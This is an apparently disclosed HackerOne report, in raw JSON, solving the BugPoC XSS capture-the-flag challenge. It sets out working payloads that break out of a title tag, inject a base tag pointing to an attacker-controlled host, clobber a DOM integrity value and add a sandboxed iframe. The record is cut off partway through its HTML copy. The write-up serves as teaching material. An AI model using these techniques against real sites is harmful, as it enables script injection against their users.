{"id":1026585,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDI2NTg1","url":"https://hackerone.com/reports/1026585","title":"Solution to the XSS Challenge ","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2020-11-05T08:22:29.252Z","submitted_at":"2020-11-05T08:22:29.276Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"virenpawar","url":"/virenpawar","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/A6uCWvc4eMMyq8HqjRo4AbMr/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":49074,"url":"https://hackerone.com/bugpoc","handle":"bugpoc","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"BugPoC","twitter_handle":"bugpoc_official","website":"http://bugpoc.com","about":"A Platform to Build and Share Proof-of-Concepts for Bug Bounty Submissions, PenTest Deliverables, \u0026 Red Team Reports."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-24T18:17:59.678Z","bug_reporter_agreed_on_going_public_at":"2020-11-24T10:05:16.270Z","team_member_agreed_on_going_public_at":"2020-11-24T18:17:59.520Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nThis challenge is very tricky and advanced. I have reached a part where I can execute my JS code, but that payload is blocked as of now by \"allow-modals\" missing value in the \"sandbox\" attribute. Following is a better explanation of where I am right now.\n\n## Steps To Reproduce:\n  1. Keep the console open in the new tab.\n  2. Open http://xss-server.herokuapp.com/challenge in that tab.\n  3. You can see the output of `console.log(origin)`.\n\n## Working Logic:\n- Assuming the reflection and input handling, the path `/frame.html` made me feel wacky to check on.\n- First blocker was `window.name == 'iframe'`, solved that using the behavior of `window.name`. The aforementioned behavior is like the `window.name` value stays persistent over the browser's tab. By this, I mean that `test.com`can set `window.name` property to anything, and visiting another domain in the same tab and checking `window.name` in another domain will reflect the same value which is defined at the `test.com` domain. Used this nature at the actual source-code of the **Steps To Reproduce - Step 2's mentioned domain** and the source code is:\n\n```html\n\u003cscript\u003e\n    window.name = \"iframe\";\n    location = \"https://wacky.buggywebsite.com/frame.html?param=\u003cpayload\u003e\";\n\u003c/script\u003e\n```\n- Saw that there was input reflection in the `\u003ctitle\u003e`tag, tried many ways to pop-up an `alert(...)` over there, but everything was blocked due to **CSP restrictions**. Checked those rules at **https://csp-evaluator.withgoogle.com** and saw there one interesting high severity finding and that was `base-uri [missing]`\n- From here the actual payload making started and that was `\u003c/title\u003e\u003cbase href=\"https://xss-server.herokuapp.com/\" target=\"_blank\"\u003e`\n- Wonderful! Now the `\u003cscript\u003e` portion of this page was trying to add a script with path `files/analytics/js/frame-analytics.js` from my domain which was mentioned in `\u003cbase\u003e`\n- But oops! The script tag this one below the line which was checking the sha256 hash integrity value of the loaded file, as expected due to this rule loading failed with the **Failed to find a valid digest in the 'integrity' attribute ...**\n\n```javascript\nscript.setAttribute('integrity', 'sha256-'+fileIntegrity.value);\n```\n\n- To solve this blocker, used **DOM Clobbering** method as the below code was vulnerable to it: \n\n```javascript\nwindow.fileIntegrity = window.fileIntegrity || {\n\t...\n\t'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',\n\t...\n}\n\n...\nif(..){\n\tif(...){\n\t\t\t\t...\n\t\t\t\tscript.setAttribute('integrity', 'sha256-'+fileIntegrity.value);\n\t\t\t\t...\n\t}\n}\n```\n- Watching the usage of `fileIntegrity.value`, debugged with some knowledge and available resources on web, I was successfully able to manipulate this value using this: `\u003cinput id=fileIntegrity value=fsTs+YNWeYnCyg8cetDAFKeIlJy4YMKulXIP59iXU=\u003e`.\n- Till now, 2 blockers have been solved till now, and now my payload looks like this `\u003c/title\u003e\u003cinput id=fileIntegrity value=fsTs+YNWeYnCyg8cetDAFKeIlJy4YMKulXIP59iXU=\u003e\u003cbase href=\"https://xss-server.herokuapp.com/\" target=\"_blank\"\u003e`\n- Moving further, my script includes following code:\n\n```javascript\nscript = document.createElement('script');\nscript.setAttribute('src', 'popup.js');\nscript.setAttribute('crossorigin', 'anonymous');\ndocument.body.appendChild(script);\n```\n\n- In this script, I did create a script tag and imported another script with the name `/popup.js` from my domain, why I did this? Because changing even space in this file will result in changing of integrity value in the payload, so I did add another `\u003cscript\u003e` resource with as it was compatible with **CSP Rule:** `script-src 'nonce-****' 'strict-dynamic';`.\n\n- Coming to the present, this is the state where I am now, my script `popup.js` is being added to the `iframe` now and the code of `popup.js` is:\n\n```javascript\nconsole.log(origin);\n```\n\n- As of now, visiting http://xss-server.herokuapp.com/challenge and keeping the console open, will print the `origin` value.\n\n## Note:\n- This report is to mark where I am now and will post more updates over here, once I get the proper `alert(origin)` box.\n- This report has a script uploaded on my domain. I tried a lot to find resources on https://bugpoc.com for hosting my files and more but couldn't find a way.\n\n## Impact\n\n## ~~Impacts~~ Advantages:\nThis is a CTF challenge so I think everyone is trying to find the flag instead of finding impact :)","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eThis challenge is very tricky and advanced. I have reached a part where I can execute my JS code, but that payload is blocked as of now by \u0026quot;allow-modals\u0026quot; missing value in the \u0026quot;sandbox\u0026quot; attribute. Following is a better explanation of where I am right now.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eKeep the console open in the new tab.\u003c/li\u003e\n\u003cli\u003eOpen \u003ca title=\"http://xss-server.herokuapp.com/challenge\" href=\"/redirect?url=http%3A%2F%2Fxss-server.herokuapp.com%2Fchallenge\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://xss-server.herokuapp.com/challenge\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in that tab.\u003c/li\u003e\n\u003cli\u003eYou can see the output of \u003ccode\u003econsole.log(origin)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"working-logic\"\u003eWorking Logic:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAssuming the reflection and input handling, the path \u003ccode\u003e/frame.html\u003c/code\u003e made me feel wacky to check on.\u003c/li\u003e\n\u003cli\u003eFirst blocker was \u003ccode\u003ewindow.name == \u0026#39;iframe\u0026#39;\u003c/code\u003e, solved that using the behavior of \u003ccode\u003ewindow.name\u003c/code\u003e. The aforementioned behavior is like the \u003ccode\u003ewindow.name\u003c/code\u003e value stays persistent over the browser\u0026#39;s tab. By this, I mean that \u003ccode\u003etest.com\u003c/code\u003ecan set \u003ccode\u003ewindow.name\u003c/code\u003e property to anything, and visiting another domain in the same tab and checking \u003ccode\u003ewindow.name\u003c/code\u003e in another domain will reflect the same value which is defined at the \u003ccode\u003etest.com\u003c/code\u003e domain. Used this nature at the actual source-code of the \u003cstrong\u003eSteps To Reproduce - Step 2\u0026#39;s mentioned domain\u003c/strong\u003e and the source code is:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eiframe\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003elocation\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://wacky.buggywebsite.com/frame.html?param=\u0026lt;payload\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eSaw that there was input reflection in the \u003ccode\u003e\u0026lt;title\u0026gt;\u003c/code\u003etag, tried many ways to pop-up an \u003ccode\u003ealert(...)\u003c/code\u003e over there, but everything was blocked due to \u003cstrong\u003eCSP restrictions\u003c/strong\u003e. Checked those rules at \u003cstrong\u003e\u003ca title=\"https://csp-evaluator.withgoogle.com\" href=\"/redirect?url=https%3A%2F%2Fcsp-evaluator.withgoogle.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://csp-evaluator.withgoogle.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/strong\u003e and saw there one interesting high severity finding and that was \u003ccode\u003ebase-uri [missing]\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eFrom here the actual payload making started and that was \u003ccode\u003e\u0026lt;/title\u0026gt;\u0026lt;base href=\u0026quot;https://xss-server.herokuapp.com/\u0026quot; target=\u0026quot;_blank\u0026quot;\u0026gt;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eWonderful! Now the \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e portion of this page was trying to add a script with path \u003ccode\u003efiles/analytics/js/frame-analytics.js\u003c/code\u003e from my domain which was mentioned in \u003ccode\u003e\u0026lt;base\u0026gt;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eBut oops! The script tag this one below the line which was checking the sha256 hash integrity value of the loaded file, as expected due to this rule loading failed with the \u003cstrong\u003eFailed to find a valid digest in the \u0026#39;integrity\u0026#39; attribute ...\u003c/strong\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetAttribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eintegrity\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esha256-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003efileIntegrity\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eTo solve this blocker, used \u003cstrong\u003eDOM Clobbering\u003c/strong\u003e method as the below code was vulnerable to it: \u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efileIntegrity\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efileIntegrity\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003evalue\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eunzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(..){\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(...){\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetAttribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eintegrity\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esha256-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003efileIntegrity\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eWatching the usage of \u003ccode\u003efileIntegrity.value\u003c/code\u003e, debugged with some knowledge and available resources on web, I was successfully able to manipulate this value using this: \u003ccode\u003e\u0026lt;input id=fileIntegrity value=fsTs+YNWeYnCyg8cetDAFKeIlJy4YMKulXIP59iXU=\u0026gt;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eTill now, 2 blockers have been solved till now, and now my payload looks like this \u003ccode\u003e\u0026lt;/title\u0026gt;\u0026lt;input id=fileIntegrity value=fsTs+YNWeYnCyg8cetDAFKeIlJy4YMKulXIP59iXU=\u0026gt;\u0026lt;base href=\u0026quot;https://xss-server.herokuapp.com/\u0026quot; target=\u0026quot;_blank\u0026quot;\u0026gt;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eMoving further, my script includes following code:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003escript\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003escript\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetAttribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esrc\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003epopup.js\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetAttribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ecrossorigin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eanonymous\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eIn this script, I did create a script tag and imported another script with the name \u003ccode\u003e/popup.js\u003c/code\u003e from my domain, why I did this? Because changing even space in this file will result in changing of integrity value in the payload, so I did add another \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e resource with as it was compatible with \u003cstrong\u003eCSP Rule:\u003c/strong\u003e \u003ccode\u003escript-src \u0026#39;nonce-****\u0026#39; \u0026#39;strict-dynamic\u0026#39;;\u003c/code\u003e.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eComing to the present, this is the state where I am now, my script \u003ccode\u003epopup.js\u003c/code\u003e is being added to the \u003ccode\u003eiframe\u003c/code\u003e now and the code of \u003ccode\u003epopup.js\u003c/code\u003e is:\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eorigin\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eAs of now, visiting \u003ca title=\"http://xss-server.herokuapp.com/challenge\" href=\"/redirect?url=http%3A%2F%2Fxss-server.herokuapp.com%2Fchallenge\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://xss-server.herokuapp.com/challenge\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and keeping the console open, will print the \u003ccode\u003eorigin\u003c/code\u003e value.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"note\"\u003eNote:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eThis report is to mark where I am now and will post more updates over here, once I get the proper \u003ccode\u003ealert(origin)\u003c/code\u003e box.\u003c/li\u003e\n\u003cli\u003eThis report has a script uploaded on my domain. I tried a lot to find resources on \u003ca title=\"https://bugpoc.com\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for hosting my files and more but couldn\u0026#39;t find a way.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch2 id=\"impacts-advantages\"\u003e\n\u003cdel\u003eImpacts\u003c/del\u003e Advantages:\u003c/h2\u003e\n\n\u003cp\u003eThis is a CTF challenge so I think everyone is trying to find the flag instead of finding impact :)\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-24T10:05:16.398Z","allow_singular_disclosure_after":-410837.610090967,"singular_disclosure_allowed":true,"vote_count":19,"voters":["virenpawar","demonia","h4x0r-dz","salmanjamal","cryptographer","nims786","6f7a7a","infinyte7","alokbatham","fizzy_fizz","and 9 more..."],"structured_scope":{"databaseId":51128,"asset_type":"URL","asset_identifier":"*.buggywebsite.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9731146,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"## Update [Completion of above mentioned report]\n- Assuming that you have read the entire above report and you are known where I was in my above-mentioned case, where I was successful in getting `console.log(origin)` and now I am having the complete XSS.\n\n## Steps To Reproduce:\n   1. Visit: https://xss-server.herokuapp.com/challenge\n\n## Changes:\n- After getting blocked my multiple times for `alert(...)` due to missing `allow-modals` in sandbox attribute error.\n- I analyzed the script on the `frame.html` very carefully and reasoned myself for each line.\n- Coming at the generic code of adding `iframe` I noticed that `allow-same-origin` is present which allows the child frame to access the parent frame and all its document body.\n- In addition to my previous payload, I have added: `\u003ciframe sandbox=\"allow-scripts allow-modals allow-same-origin\" name=\"analyticsframe\" class=\"invisible\"\u003e\u003c/iframe\u003e` so that I can refer this `\u003ciframe\u003e` in below code.\n- As I said earlier I haven't changed the `files/analytics/js/frame-analytics.js` of my server, changed the `popup.js` code which is this:\n\n```javascript\nscript = document.createElement('script');\nscript.setAttribute('src', 'ao.js');\n//script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);\nscript.setAttribute('crossorigin', 'anonymous');\nwindow.top.document.getElementsByTagName('iframe')[0].contentDocument.body.appendChild(script);\n```\n\n- In this code, I am creating a `script` element, and using the `allow-same-origin` sandbox attribute to append my `\u003ciframe\u003e` which has `allow-modals` allowed in the sandbox attribute. \n\n- Contents of `ao.js`: `alert(origin);`\n\n- So my finalized payload is: \n\n```html\n\u003c/title\u003e\u003cinput id=fileIntegrity value=cGkWfmcd5KHg/6pcwwGbw0pqZl6Mxr+TyM1O6btW1ds=\u003e\u003cbase href=\"https://xss-server.herokuapp.com/\" target=\"_blank\"\u003e\u003ciframe sandbox=\"allow-scripts allow-modals allow-same-origin\" name=\"analyticsframe\" class=\"invisible\"\u003e\u003c/iframe\u003e\n```\n\n- Hope, I did my best to make this understand and which things are being used over here and the reason behind using them. For any clarification or doubt, feel free to ping me.\n\n## Proof Of Concept:\n- Screenshot\n\n{F1065946}","markdown_message":"\u003ch2 id=\"update-completion-of-above-mentioned-report\"\u003eUpdate [Completion of above mentioned report]\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAssuming that you have read the entire above report and you are known where I was in my above-mentioned case, where I was successful in getting \u003ccode\u003econsole.log(origin)\u003c/code\u003e and now I am having the complete XSS.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eVisit: \u003ca title=\"https://xss-server.herokuapp.com/challenge\" href=\"/redirect?url=https%3A%2F%2Fxss-server.herokuapp.com%2Fchallenge\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://xss-server.herokuapp.com/challenge\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"changes\"\u003eChanges:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAfter getting blocked my multiple times for \u003ccode\u003ealert(...)\u003c/code\u003e due to missing \u003ccode\u003eallow-modals\u003c/code\u003e in sandbox attribute error.\u003c/li\u003e\n\u003cli\u003eI analyzed the script on the \u003ccode\u003eframe.html\u003c/code\u003e very carefully and reasoned myself for each line.\u003c/li\u003e\n\u003cli\u003eComing at the generic code of adding \u003ccode\u003eiframe\u003c/code\u003e I noticed that \u003ccode\u003eallow-same-origin\u003c/code\u003e is present which allows the child frame to access the parent frame and all its document body.\u003c/li\u003e\n\u003cli\u003eIn addition to my previous payload, I have added: \u003ccode\u003e\u0026lt;iframe sandbox=\u0026quot;allow-scripts allow-modals allow-same-origin\u0026quot; name=\u0026quot;analyticsframe\u0026quot; class=\u0026quot;invisible\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e so that I can refer this \u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e in below code.\u003c/li\u003e\n\u003cli\u003eAs I said earlier I haven\u0026#39;t changed the \u003ccode\u003efiles/analytics/js/frame-analytics.js\u003c/code\u003e of my server, changed the \u003ccode\u003epopup.js\u003c/code\u003e code which is this:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003escript\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003escript\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetAttribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esrc\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eao.js\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e//script.setAttribute(\u0026#39;integrity\u0026#39;, \u0026#39;sha256-\u0026#39;+fileIntegrity.value);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetAttribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ecrossorigin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eanonymous\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etop\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementsByTagName\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 